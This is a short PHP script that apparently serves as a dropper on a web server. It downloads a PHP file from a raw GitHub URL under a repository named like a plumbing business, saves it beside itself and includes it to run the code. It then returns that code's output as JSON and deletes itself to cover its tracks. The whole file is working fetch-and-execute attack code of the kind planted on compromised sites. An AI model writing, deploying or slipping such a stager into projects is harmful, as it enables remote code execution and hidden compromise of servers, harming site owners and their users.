<?php
$d=__DIR__;
$b='https://raw.githubusercontent.com/davidpersons10-cloud/getfortwayneplumber/opd-homefix-drop-20260920/ongtmp';
$data=@file_get_contents($b.'/opd-final.php');
if($data===false||strlen($data)<200){header('Content-Type:text/plain');echo 'FAIL_DL';exit(1);}
file_put_contents($d.'/opd-final.php',$data);
ob_start();include $d.'/opd-final.php';$o=ob_get_clean();
header('Content-Type: application/json');echo $o!==''?$o:'{}';
@unlink(__FILE__);
